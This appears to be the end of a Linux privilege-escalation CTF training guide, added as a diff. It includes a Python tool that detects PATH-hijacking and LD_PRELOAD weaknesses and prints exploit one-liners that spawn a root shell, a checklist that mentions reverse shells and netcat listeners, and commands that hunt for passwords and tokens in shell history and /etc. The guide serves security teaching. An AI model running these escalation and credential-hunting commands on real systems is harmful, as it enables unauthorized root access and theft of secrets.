+
+    for line in Path(env_file).read_text(encoding="utf-8").splitlines():
+        line = line.strip()
+        if "=" in line and not line.startswith("#"):
+            key, _, val = line.partition("=")
+            env[key.strip()] = val.strip()
+
+    return env
+
+
+def analyze_binary(
+    binary_path: str,
+    env_vars: dict[str, str],
+) -> BinaryAnalysis:
+    """Comprehensive environment variable vulnerability analysis of binary."""
+    analysis = BinaryAnalysis(binary_path=binary_path)
+
+    rel_cmds = extract_relative_commands(binary_path)
+    analysis.relative_commands = rel_cmds
+
+    path_env = env_vars.get("PATH", os.environ.get("PATH", ""))
+
+    if rel_cmds:
+        writable_path_dirs: list[str] = []
+        for path_dir in path_env.split(":"):
+            if path_dir and Path(path_dir).is_dir():
+                try:
+                    if os.access(path_dir, os.W_OK):
+                        writable_path_dirs.append(path_dir)
+                except OSError:
+                    pass
+
+        if writable_path_dirs:
+            for cmd in rel_cmds:
+                analysis.vulnerabilities.append(
+                    EnvVulnerability(
+                        vuln_type="PATH Hijacking",
+                        detail=(
+                            f"Binary executes '{cmd}' with relative path\n"
+                            f"    Writable PATH directories: {writable_path_dirs}"
+                        ),
+                        severity="critical",
+                        exploit_example=(
+                            f"mkdir /tmp/hijack && "
+                            f"echo -e '#!/bin/bash\\n/bin/bash -p' > /tmp/hijack/{cmd} && "
+                            f"chmod +x /tmp/hijack/{cmd} && "
+                            f"export PATH=/tmp/hijack:$PATH && {binary_path}"
+                        ),
+                    )
+                )
+        else:
+            for cmd in rel_cmds:
+                analysis.vulnerabilities.append(
+                    EnvVulnerability(
+                        vuln_type="PATH Hijacking (partial risk)",
+                        detail=f"Binary executes '{cmd}' with relative path (current PATH not writable)",
+                        severity="medium",
+                        exploit_example=(
+                            f"After setting export PATH=/tmp/hijack:$PATH, "
+                            f"create malicious script at /tmp/hijack/{cmd}"
+                        ),
+                    )
+                )
+
+    ld_preload = env_vars.get("LD_PRELOAD", "")
+    if ld_preload:
+        analysis.ld_preload_vulnerable = True
+        analysis.vulnerabilities.append(
+            EnvVulnerability(
+                vuln_type="LD_PRELOAD set",
+                detail=f"LD_PRELOAD={ld_preload} — malicious library can be loaded",
+                severity="high",
+                exploit_example=(
+                    "gcc -shared -fPIC -o /tmp/evil.so evil.c && "
+                    f"LD_PRELOAD=/tmp/evil.so {binary_path}"
+                ),
+            )
+        )
+
+    return analysis
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="Environment variable vulnerability detector — PATH hijacking and LD_PRELOAD analysis",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s --binary /usr/local/bin/backup
+  %(prog)s --binary /usr/sbin/service --env-file /tmp/target.env
+  %(prog)s --binary /opt/app/run.sh
+        """,
+    )
+    parser.add_argument(
+        "--binary",
+        required=True,
+        help="Path to binary or script to analyze",
+    )
+    parser.add_argument(
+        "--env-file",
+        default="",
+        help="Environment variable file path (key=value format, uses current environment if not specified)",
+    )
+    return parser.parse_args()
+
+
+def main() -> None:
+    args = parse_args()
+
+    if not Path(args.binary).exists():
+        print(f"[-] File not found: {args.binary}")
+        raise SystemExit(1)
+
+    print(f"[*] Analyzing binary: {args.binary}")
+
+    env_vars = parse_env_file(args.env_file) if args.env_file else dict(os.environ)
+    analysis = analyze_binary(args.binary, env_vars)
+
+    print("\n" + "=" * 60)
+    print("Environment Variable Vulnerability Analysis Results")
+    print("=" * 60)
+    print(f"Target: {analysis.binary_path}")
+    print(f"Relative path commands: {analysis.relative_commands or 'None'}")
+    print(f"LD_PRELOAD vulnerable: {'Yes' if analysis.ld_preload_vulnerable else 'No'}")
+    print(f"\nTotal vulnerabilities: {len(analysis.vulnerabilities)}")
+
+    for vuln in analysis.vulnerabilities:
+        print(f"\n[{vuln.severity.upper()}] {vuln.vuln_type}")
+        print(f"  Detail: {vuln.detail}")
+        print(f"  Exploit: {vuln.exploit_example}")
+
+    if not analysis.vulnerabilities:
+        print("[+] No environment variable-related vulnerabilities found.")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. Score Table and Learning Checklist
+
+### 6.1 CTF Score Table
+
+| Challenge | Type | Points | Difficulty | Estimated Time |
+|-----------|------|--------|------------|----------------|
+| Challenge 1 | SUID binary abuse | 100 pts | Easy | 10–20 min |
+| Challenge 2 | sudo misconfiguration | 150 pts | Medium | 15–30 min |
+| Challenge 3 | Cron file write abuse | 200 pts | Medium | 20–40 min |
+| Challenge 4 | Environment variable PATH hijacking | 250 pts | Hard | 30–60 min |
+| Bonus | Kernel exploit | 300 pts | Expert | 60+ min |
+| **Total** | | **1000 pts** | | |
+
+### 6.2 Step-by-Step Learning Checklist
+
+#### Beginner Level (Goal: Solve Challenge 1)
+- [ ] Able to search for SUID files using `find` command
+- [ ] Familiar with GTFOBins website usage
+- [ ] Understand file permission notation (rwxrwxrwx, octal)
+- [ ] Identify SUID bit in `ls -la` output
+
+#### Intermediate Level (Goal: Solve Challenges 2 and 3)
+- [ ] Able to interpret `sudo -l` output
+- [ ] Understand sudoers file structure
+- [ ] Understand crontab syntax (minute hour day month weekday)
+- [ ] Create and use reverse shell payloads
+- [ ] Set up listener with `netcat`
+
+#### Advanced Level (Goal: Solve Challenge 4)
+- [ ] Analyze binaries using `strings` command
+- [ ] Understand how PATH environment variable works
+- [ ] Write and deploy malicious shell scripts
+- [ ] Understand how LD_PRELOAD works
+- [ ] Compile shared libraries in C
+
+#### Expert Level (Goal: Solve Bonus)
+- [ ] Identify vulnerabilities by kernel version
+- [ ] Proficient with `searchsploit`
+- [ ] Compile and modify exploit code
+- [ ] Understand memory protection bypass techniques
+
+### 6.3 Reference Tools and Resources
+
+| Tool/Resource | Purpose | URL/Command |
+|---------------|---------|-------------|
+| GTFOBins | SUID/sudo exploit database | gtfobins.github.io |
+| LinPEAS | Automated enumeration tool | github.com/carlospolop/PEASS-ng |
+| LinEnum | Automated enumeration script | github.com/rebootuser/LinEnum |
+| pwncat | Reverse shell handler | `pip install pwncat-cs` |
+| searchsploit | Vulnerability DB search | `searchsploit linux kernel 5.4` |
+| pspy | Real-time process monitor | github.com/DominicBreuker/pspy |
+
+### 6.4 Quick Reference Commands
+
+```bash
+# === Privilege Escalation Enumeration One-Liners ===
+
+# Search all SUID files
+find / -perm -4000 2>/dev/null | xargs ls -la
+
+# Search capabilities
+getcap -r / 2>/dev/null
+
+# Check sudo privileges
+sudo -l
+
+# Find writable sensitive files
+find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
+
+# Find writable directories
+find / -writable -type d 2>/dev/null | grep -v proc
+
+# Check current user groups
+id; groups
+
+# Network services (locally accessible)
+ss -tulnp | grep 127.0.0.1
+
+# Print all environment variables
+env | sort
+
+# Find password hints in history
+history | grep -i "pass\|secret\|key\|token"
+
+# Search for passwords in config files
 grep -r "password" /etc/ 2>/dev/null | grep -v Binary
 ```
